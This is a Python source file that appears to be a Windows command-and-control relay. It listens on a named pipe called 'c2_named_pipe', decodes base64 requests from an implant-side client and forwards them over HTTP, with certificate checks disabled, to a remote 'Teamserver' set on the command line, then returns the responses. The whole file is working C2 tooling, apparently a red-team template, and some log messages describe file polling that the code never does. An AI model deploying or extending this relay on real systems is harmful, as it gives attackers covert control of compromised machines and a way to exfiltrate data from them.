import argparse
import base64
import http.client
import json
import logging
import ssl
import time
from pathlib import Path
from typing import Any, Callable, Dict, List, Optional

import pywintypes
import win32file
import win32pipe

# ---------------------------------------------------------------------------
# Configuration
# ---------------------------------------------------------------------------

REQUEST_FILE = Path("request.txt")
RESPONSE_FILE = Path("response.txt")
PIPE_NAME = r"\\.\\pipe\\c2_named_pipe"
POLL_INTERVAL = 0.5  # seconds

logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [%(levelname)s] %(message)s",
)

CLI_HOST: Optional[str] = None
CLI_PORT: Optional[int] = None


# ---------------------------------------------------------------------------
# Core HTTP bridge logic (decode → parse → send HTTP → encode)
# ---------------------------------------------------------------------------

def decode_request(encoded_request: str) -> Dict[str, Any]:
    """
    Decode the base64-encoded JSON request into a Python dictionary.
    """
    logging.debug("Decoding incoming request (length: %d).", len(encoded_request))
    decoded_bytes = base64.b64decode(encoded_request)
    decoded_str = decoded_bytes.decode("utf-8")
    logging.debug("Decoded request JSON: %s", decoded_str)
    return json.loads(decoded_str)


def build_headers(header_lines: Optional[List[str]]) -> Dict[str, str]:
    """
    Build a headers dictionary from a list of 'Name: Value' strings.
    """
    headers: Dict[str, str] = {}
    if not header_lines:
        logging.debug("No headers provided in request.")
        return headers

    for line in header_lines:
        if not line:
            continue
        if ":" in line:
            name, value = line.split(":", 1)
            name = name.strip()
            value = value.strip()
            headers[name] = value
            logging.debug("Parsed header: %s: %s", name, value)
        else:
            logging.warning("Skipping malformed header line (no colon found): %r", line)

    logging.info("Built %d request headers.", len(headers))
    return headers


def send_http_request(request: Dict[str, Any]) -> Dict[str, Any]:
    """
    Send an HTTP/HTTPS request based on the decoded request dictionary.
    """
    scheme = request.get("scheme", "http")
    host = CLI_HOST
    port = CLI_PORT
    path = request.get("path", "/")
    method = request.get("method", "GET")
    headers = build_headers(request.get("headers"))
    body_b64 = request.get("body", "")
    body = base64.b64decode(body_b64) if body_b64 else None

    if not host:
        raise ValueError("Request 'host' field is required.")

    if port is None:
        port = 443 if scheme == "https" else 80

    logging.info(
        "Preparing %s request to %s://%s:%s%s",
        method,
        scheme,
        host,
        port,
        path,
    )
    logging.debug("Request headers: %r", headers)
    if body is not None:
        logging.info("Request has a body (%d bytes).", len(body))

    connection_cls = http.client.HTTPSConnection if scheme == "https" else http.client.HTTPConnection

    if scheme == "https":
        logging.debug("Creating HTTPS connection with unverified SSL context.")
        conn = connection_cls(host, port, context=ssl._create_unverified_context(), timeout=10)
    else:
        logging.debug("Creating HTTP connection.")
        conn = connection_cls(host, port, timeout=10)

    try:
        conn.request(method, path, body=body, headers=headers)
        logging.info("Request sent, awaiting response...")
        resp = conn.getresponse()
        resp_body = resp.read()
        logging.info(
            "Received response: %s %s (%d bytes).",
            resp.status,
            resp.reason,
            len(resp_body),
        )
        resp_headers_list = [f"{k}: {v}" for k, v in resp.getheaders()]
        logging.debug("Response headers: %r", resp_headers_list)
    finally:
        conn.close()
        logging.debug("Connection to %s:%s closed.", host, port)

    return {
        "status_code": resp.status,
        "status_text": resp.reason,
        "headers": resp_headers_list,
        "body": base64.b64encode(resp_body).decode("ascii"),
    }


def encode_response(response_obj: Dict[str, Any]) -> str:
    """
    Encode a response dictionary as base64-encoded JSON.
    """
    json_bytes = json.dumps(response_obj).encode("utf-8")
    logging.debug("Encoding response JSON (%d bytes) to base64.", len(json_bytes))
    return base64.b64encode(json_bytes).decode("ascii")


def process_encoded_request(encoded_request: str) -> str:
    """
    High-level core processing function.

    Takes raw encoded request data and returns raw encoded response data.

    Steps:
      1. Decode base64 → JSON → dict
      2. Perform HTTP/HTTPS request based on dict
      3. Encode response dict → JSON → base64
    """
    logging.info("Processing encoded request (length: %d).", len(encoded_request))
    request_obj = decode_request(encoded_request)
    logging.debug("Decoded request object: %r", request_obj)

    response_obj = send_http_request(request_obj)
    encoded_response = encode_response(response_obj)
    logging.info("Encoded response (length: %d).", len(encoded_response))

    return encoded_response


# ---------------------------------------------------------------------------
# handle a callback
# 
# This function is what you modify!
#
# ---------------------------------------------------------------------------

def handleCallback(process_func: Callable[[str], str] = process_encoded_request) -> bool:
    """
    Handle a single callback cycle over a named pipe connection.

    Creates a named pipe instance, waits for a client, exchanges a length-prefixed
    request/response pair, and then cleans up.
    """
    pipe_handle: Optional[int] = None

    def _read_exact(handle: int, num_bytes: int) -> bytes:
        chunks: list[bytes] = []
        remaining = num_bytes
        while remaining > 0:
            _, data = win32file.ReadFile(handle, remaining)
            if not data:
                raise RuntimeError("Pipe closed while reading data")
            chunks.append(data)
            remaining -= len(data)
        return b"".join(chunks)

    def _read_length_prefixed(handle: int) -> bytes:
        _, raw_len = win32file.ReadFile(handle, 4)
        if len(raw_len) != 4:
            raise RuntimeError("Failed to read message length")
        msg_len = int.from_bytes(raw_len, byteorder="little")
        if msg_len == 0:
            raise RuntimeError("Received empty message")
        return _read_exact(handle, msg_len)

    def _write_length_prefixed(handle: int, payload: bytes) -> None:
        win32file.WriteFile(handle, len(payload).to_bytes(4, byteorder="little"))
        if payload:
            win32file.WriteFile(handle, payload)

    try:
        pipe_handle = win32pipe.CreateNamedPipe(
            PIPE_NAME,
            win32pipe.PIPE_ACCESS_DUPLEX,
            win32pipe.PIPE_TYPE_MESSAGE | win32pipe.PIPE_READMODE_MESSAGE | win32pipe.PIPE_WAIT,
            1,
            0x10000,
            0x10000,
            0,
            None,
        )

        logging.info("Waiting for named pipe client on %s", PIPE_NAME)
        win32pipe.ConnectNamedPipe(pipe_handle, None)
        logging.info("Client connected. Reading request.")

        raw_request = _read_length_prefixed(pipe_handle)
        encoded_request = raw_request.decode("utf-8")

        encoded_response = process_func(encoded_request)
        _write_length_prefixed(pipe_handle, encoded_response.encode("utf-8"))
        logging.info("Sent response over named pipe (%d bytes).", len(encoded_response))

        return True

    except pywintypes.error as exc:  # noqa: BLE001
        logging.error("Named pipe error: %s", exc)
        return False
    except Exception as exc:  # noqa: BLE001
        logging.exception("Error in handleCallback: %s", exc)
        return False
    finally:
        if pipe_handle is not None:
            try:
                win32pipe.DisconnectNamedPipe(pipe_handle)
            except pywintypes.error:
                pass
            win32file.CloseHandle(pipe_handle)


# ---------------------------------------------------------------------------
# Entry point
# ---------------------------------------------------------------------------

def main() -> None:
    """
    Entry point. Repeatedly calls handleCallback to process requests.
    """
    global CLI_HOST, CLI_PORT

    parser = argparse.ArgumentParser(description="HTTP bridge broker.")
    parser.add_argument(
        "--host",
        dest="host",
        required=True,
        help="Destination host for outgoing requests (required).",
    )
    parser.add_argument(
        "--port",
        dest="port",
        type=int,
        required=True,
        help="Destination port for outgoing requests (required).",
    )
    args = parser.parse_args()

    CLI_HOST = args.host or CLI_HOST
    CLI_PORT = args.port if args.port is not None else CLI_PORT


    logging.info("Teamserver host: %s", CLI_HOST)

    logging.info("Teamserver port: %s", CLI_PORT)

    logging.info(
        "Starting HTTP bridge. Polling %s every %.2f seconds.",
        REQUEST_FILE,
        POLL_INTERVAL,
    )

    while True:
        handled = handleCallback(process_encoded_request)
        if not handled:
            time.sleep(POLL_INTERVAL)


if __name__ == "__main__":
    main()
